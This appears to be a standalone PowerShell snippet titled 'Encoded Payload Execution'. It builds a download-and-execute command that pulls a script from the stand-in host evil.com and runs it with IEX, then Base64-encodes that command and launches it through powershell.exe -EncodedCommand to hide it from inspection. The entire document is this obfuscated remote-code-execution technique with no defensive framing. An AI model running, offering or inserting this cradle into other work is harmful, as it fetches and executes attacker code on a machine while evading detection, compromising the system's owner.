# Encoded Payload Execution
$command = 'IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded